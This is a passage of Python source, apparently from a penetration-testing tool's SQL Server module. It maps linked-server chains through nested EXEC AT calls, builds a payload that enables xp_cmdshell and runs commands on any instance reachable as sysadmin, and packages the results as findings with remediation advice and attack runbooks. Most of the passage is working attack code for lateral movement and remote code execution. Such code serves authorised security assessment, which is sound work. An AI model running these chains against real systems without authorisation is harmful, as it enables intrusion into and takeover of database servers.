    "FROM sys.servers WHERE is_linked=1 FOR XML PATH('')),1,1,''),'')")
# The command run AT a node for effect (RCE) once you hold sysadmin there.
_RCE_INNER = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
              "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'")


def _nested_at(path: list[str], inner: str) -> str:
    """Wrap `inner` in EXEC('...') AT [link] for each hop in `path` (entry->path[0]
    ->path[1]->...). Single quotes are doubled once per level - the standard
    linked-server chaining. path=[] returns inner unchanged."""
    s = inner
    for link in reversed(path):
        s = "EXEC ('%s') AT [%s]" % (s.replace("'", "''"), link)
    return s


def _parse_link_node(output: str, idx: int) -> dict | None:
    """Pull the '@@L:idx .. @@LE:idx'-wrapped result row for one path."""
    import re
    m = re.search(rf"@@L:{idx}\b(.*?)@@LE:{idx}\b", output, re.S)
    if not m:
        return None
    for line in m.group(1).splitlines():
        line = line.strip()
        if "|" in line and "----" not in line and not line.startswith("@@"):
            parts = [c.strip() for c in line.split("|")]
            return {"server": parts[0] if parts else "",
                    "login": parts[1] if len(parts) > 1 else "",
                    "sysadmin": len(parts) > 2 and parts[2] == "1",
                    "links": [x for x in (parts[3].split(",") if len(parts) > 3 else []) if x]}
    return None


def walk_links(entry_links: list[str], runner, max_depth: int = 4,
               max_nodes: int = 60) -> list[dict]:
    """BFS the linked-server graph from the entry instance. `entry_links` is the
    entry's own linked-server names; `runner(script)->output` runs a sentinel batch
    ON THE ENTRY instance (the nested EXEC AT reaches through). Returns nodes:
    {path, depth, server, login, sysadmin, links}. Cycles + depth + node count are
    all bounded so a bidirectional linked-server mesh can't loop forever."""
    nodes: list[dict] = []
    expanded: set[str] = set()
    frontier = [[link] for link in entry_links]
    depth = 1
    while frontier and depth <= max_depth and len(nodes) < max_nodes:
        parts = []
        for i, path in enumerate(frontier):
            parts.append(f"SELECT '@@L:{i}'")
            parts.append(_nested_at(path, _LINK_INNER))
            parts.append(f"SELECT '@@LE:{i}'")
        out = runner("\n".join(parts) + "\nexit\n") or ""
        nxt = []
        for i, path in enumerate(frontier):
            if len(nodes) >= max_nodes:
                break
            info = _parse_link_node(out, i)
            if info is None:                       # RPC off / link down / access denied
                continue
            nodes.append({"path": path, "depth": depth, "server": info["server"],
                          "login": info["login"], "sysadmin": info["sysadmin"],
                          "links": info["links"]})
            key = (info["server"] or "|".join(path)).upper()
            if key in expanded:                    # already expanded this server - cycle
                continue
            expanded.add(key)
            path_servers = {p.upper() for p in path} | {key}
            for child in info["links"]:
                if child.upper() not in path_servers:   # don't re-enter a server on this path
                    nxt.append(path + [child])
        frontier = nxt
        depth += 1
    return nodes


def link_findings(target: dict, nodes: list[dict], creds: dict | None):
    """Findings + chain steps from a linked-server walk. Every node reachable as
    sysadmin is a full compromise of that instance (enumerate + RCE commands)."""
    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
    fs: list[dict] = []
    chain: list[str] = []
    sa_nodes = [n for n in nodes if n["sysadmin"]]
    for n in sa_nodes:
        route = " -> ".join([target.get("live_login") or "entry"] + n["path"])
        server = n["server"] or n["path"][-1]
        fs.append(_finding(
            "critical", f"Linked-server chain to SYSADMIN on {server}", tgt,
            f"Reachable as sysadmin ({n['login']}) on {server} via {route} "
            f"(depth {n['depth']}).", "impacket-mssqlclient / mssqlpwner",
            _nested_at(n["path"], _RCE_INNER),
            "Fix the linked-server login mapping (don't map to sysadmin); disable "
            "'rpc out' where not required.", ["CWE-269", "CWE-284"]))
        chain.append(f"reach SYSADMIN on {server} via linked chain ({route}) -> "
                     "xp_cmdshell RCE")
    if nodes and not sa_nodes:
        deepest = max(nodes, key=lambda n: n["depth"])
        fs.append(_finding(
            "medium", f"Linked-server graph: {len(nodes)} instance(s) reachable", tgt,
            "Reachable linked instances: " + ", ".join(
                (n["server"] or n["path"][-1]) + (" [sa]" if n["sysadmin"] else "")
                for n in nodes[:10]) + f". Deepest: {' -> '.join(deepest['path'])}.",
            "impacket-mssqlclient / mssqlpwner",
            _nested_at(deepest["path"], "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"),
            "Review linked-server login mappings and 'rpc out' settings.", ["CWE-284"]))
    return fs, chain


# --- top-level analysis ---------------------------------------------------------

def findings_to_vulns(fs: list[dict]) -> dict:
    """Convert MSSQL findings into Vuln objects, keyed by target ip, so they feed
    the main severity totals / Vulnerabilities sheet / writeups. Returns {ip:[Vuln]}."""
    from .models import Vuln
    by_ip: dict[str, list] = {}
    for f in fs:
        ip = f["target"].split(":")[0]
        port = int(f["target"].split(":")[1]) if ":" in f["target"] else 1433
        evidence = f.get("detail", "")
        if f.get("command"):
            evidence += f"\n\nProve / next step:\n{f['command']}"
        by_ip.setdefault(ip, []).append(Vuln(
            ip=ip, port=port, protocol="tcp",
            script_id=f"mssql:{f['title'][:40]}", state="finding", title=f["title"],
            severity=f["severity"], source="mssql", confidence="confirmed",
            cwes=list(f.get("cwes") or ["CWE-284"]),
            output=evidence.strip(), remediation=f.get("remediation", "")))
    return by_ip


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            lhost: str = "<LHOST>") -> dict:
    """Full MSSQL analysis: pre-auth probes, findings, and the per-target runbook +
    chain. JSON-serialisable for the datastore + report."""
    targets = mssql_targets(hosts)
    probes: dict = {}
    for t in targets:
        key = f"{t['ip']}:{t['port']}"
        probes[key] = probe_target(t["ip"], t["port"], active=active)
        # Recover the version from the pre-login when nmap missed it.
        pv = probes[key]["prelogin"].get("version")
        if pv and not t.get("version"):
            t["version"] = pv
        t["encryption"] = probes[key]["prelogin"].get("encryption", "")
        t["instances"] = probes[key]["instances"]
    fs = findings(hosts, probes)
    runbooks = []
    for t in targets:
        runbooks.append({
            "target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
            "credfree": credfree_runbook(t, lhost),
            "credentialed": cred_runbook(t, creds, lhost),
            "chain": attack_chain(t, fs, creds)})
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    fs.sort(key=lambda x: order.get(x["severity"], 5))
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "stats": {"targets": len(targets), "findings": len(fs)}}

